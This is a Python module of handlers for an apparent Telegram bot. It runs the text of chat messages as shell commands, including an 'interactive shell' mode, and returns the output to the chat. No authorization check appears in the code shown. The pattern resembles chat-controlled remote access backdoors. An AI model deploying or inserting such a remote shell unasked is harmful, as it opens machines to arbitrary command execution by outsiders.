"""Command execution handlers"""
import os
import subprocess
from utils.file_operations import execute_command
from config import config

# Global state for interactive shell
shell_sessions = {}

def handle_execute_command(bot, message):
    """Handle single command execution"""
    try:
        command = message.text.split('/e', 1)[1].strip()
        
        # Handle directory changes
        if command == 'cd..':
            os.chdir('..')
            bot.send_message(message.chat.id, f"You are in: {os.getcwd()}")
        elif command.startswith('cd '):
            directory = command.split(' ', 1)[1].strip()
            os.chdir(directory)
            bot.send_message(message.chat.id, f"You are in: {os.getcwd()}")
        else:
            result = execute_command(command)
            
            # Split long results
            if len(result) > config.MAX_MESSAGE_LENGTH:
                # Save to file and send as document
                temp_file = os.path.join(config.TEMP_DIR, 'command_output.txt')
                with open(temp_file, 'w', encoding='utf-8') as f:
                    f.write(result)
                
                with open(temp_file, 'rb') as document:
                    bot.send_document(message.chat.id, document)
                os.remove(temp_file)
            else:
                bot.send_message(message.chat.id, f"Result:\n```\n{result}\n```", parse_mode='Markdown')
                
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {e}")

def handle_interactive_shell(bot, message):
    """Handle interactive shell session"""
    chat_id = message.chat.id
    shell_sessions[chat_id] = True
    bot.send_message(chat_id, "Interactive shell started. Type 'exit' to quit.")

def handle_shell_input(bot, message):
    """Handle input for interactive shell"""
    chat_id = message.chat.id
    command = message.text
    
    if command.lower() == 'exit':
        shell_sessions.pop(chat_id, None)
        bot.send_message(chat_id, "Shell session ended.")
        return False
    
    try:
        # Handle directory changes
        if command == 'cd..':
            os.chdir('..')
            result = f"You are in: {os.getcwd()}"
        elif command.startswith('cd '):
            directory = command.split(' ', 1)[1].strip()
            os.chdir(directory)
            result = f"You are in: {os.getcwd()}"
        else:
            result = execute_command(command)
        
        # Send result
        if len(result) > config.MAX_MESSAGE_LENGTH:
            chunks = [result[i:i + config.MAX_MESSAGE_LENGTH] 
                     for i in range(0, len(result), config.MAX_MESSAGE_LENGTH)]
            for chunk in chunks:
                bot.send_message(chat_id, f"```\n{chunk}\n```", parse_mode='Markdown')
        else:
            bot.send_message(chat_id, f"```\n{result}\n```", parse_mode='Markdown')
            
    except Exception as e:
        bot.send_message(chat_id, f"Error: {e}")
    
    return True
